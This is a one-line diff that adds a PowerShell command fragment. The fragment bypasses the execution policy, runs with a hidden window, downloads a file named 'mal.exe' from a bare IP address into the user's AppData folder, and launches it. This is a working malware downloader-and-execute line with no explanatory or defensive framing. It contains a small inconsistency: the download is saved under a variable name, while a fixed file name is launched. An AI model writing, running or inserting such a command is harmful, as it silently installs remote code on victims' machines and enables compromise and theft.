@@ -1,0 +1,1 @@
+﻿-ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://209.250.250.226/mal.exe',"$env:APPDATA\$ProcName");Start-Process ("$env:APPDATA\mal.exe")
